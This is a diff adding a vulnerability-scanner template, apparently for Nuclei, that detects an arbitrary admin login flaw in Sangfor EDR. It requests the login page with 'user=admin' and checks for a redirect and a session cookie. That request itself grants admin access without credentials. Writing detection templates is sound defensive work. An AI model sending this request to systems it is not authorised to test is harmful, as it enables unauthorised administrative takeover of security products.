@@ -1,0 +1,27 @@
+id: sangfor-edr-ui-login-php-idor
+info:
+  name: Sangfor EDR Arbitrary Admin Login
+  author: hilson
+  severity: critical
+  description: |
+    Detects an arbitrary admin login vulnerability in Sangfor EDR UI login page by checking if the server responds with a redirect to a specific installer and sets a session cookie.
+  reference:
+    - https://mp.weixin.qq.com/s/6aUrXcnab_EScoc0-6OKfA
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ui/login.php?user=admin"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "/download/edr_installer_"
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
